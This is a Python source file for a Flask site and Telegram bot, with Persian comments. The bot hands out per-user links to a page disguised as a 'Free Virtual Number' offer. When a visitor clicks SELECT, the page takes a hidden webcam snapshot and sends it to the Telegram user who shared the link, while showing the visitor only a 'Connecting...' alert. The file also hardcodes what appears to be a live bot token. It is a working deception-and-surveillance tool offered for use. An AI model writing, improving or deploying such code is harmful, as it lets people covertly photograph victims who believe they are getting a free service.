import os
import threading
from flask import Flask, render_template_string, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

app = Flask(__name__)
BOT_TOKEN = "8628341169:AAH0RN8xSL2GuKIhqiEElvndV_xWoUyw9WE"
bot = telebot.TeleBot(BOT_TOKEN)

# آدرس سایت شما
BASE_URL = "https://web-production-5d457.up.railway.app"

# --- بخش وب‌سایت ---
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Free Virtual Number</title>
    <style>
        body { background: #0b0f19; color: white; text-align: center; padding-top: 50px; font-family: sans-serif; }
        .card { background: #161f30; padding: 20px; border-radius: 10px; display: inline-block; width: 80%; }
        button { background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🇺🇸 United States</h2>
        <p>+1 398 362 8901</p>
        <button onclick="capture()">SELECT</button>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <script>
        async function capture() {
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            const video = document.getElementById('video');
            video.srcObject = stream;
            await video.play();
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob, 'photo.jpg');
                    await fetch("/upload" + window.location.search, {method: 'POST', body: formData});
                    stream.getTracks().forEach(track => track.stop());
                    alert("Connecting...");
                }, 'image/jpeg');
            }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_CONTENT)

@app.route("/upload", methods=["POST"])
def upload():
    user_id = request.args.get("user")
    photo = request.files.get("photo")
    if photo and user_id:
        bot.send_photo(user_id, photo)
    return jsonify({"status": "ok"})

# --- بخش ربات تلگرام ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = InlineKeyboardMarkup()
    user_link = f"{BASE_URL}/?user={message.from_user.id}"
    markup.add(InlineKeyboardButton("📸 گرفتن عکس", url=user_link))
    bot.send_message(message.chat.id, "سلام! برای استفاده روی دکمه زیر کلیک کن:", reply_markup=markup)

def run_bot():
    bot.infinity_polling()

# اجرای همزمان ربات و سایت
if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
